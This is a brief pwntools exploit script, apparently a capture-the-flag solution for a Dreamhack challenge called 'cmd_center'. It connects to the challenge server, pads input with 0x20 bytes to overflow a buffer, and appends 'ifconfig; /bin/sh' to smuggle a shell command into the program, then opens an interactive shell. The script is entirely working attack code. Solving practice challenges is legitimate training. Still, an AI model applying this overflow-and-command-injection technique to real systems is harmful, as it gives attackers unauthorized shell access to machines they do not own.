from pwn import *

p = remote('host3.dreamhack.games', 22827)
e = ELF('./cmd_center')

center_name = b'A' * 0x20 + b'ifconfig; /bin/sh' 
p.sendafter(b'Center name: ', center_name)

p.interactive()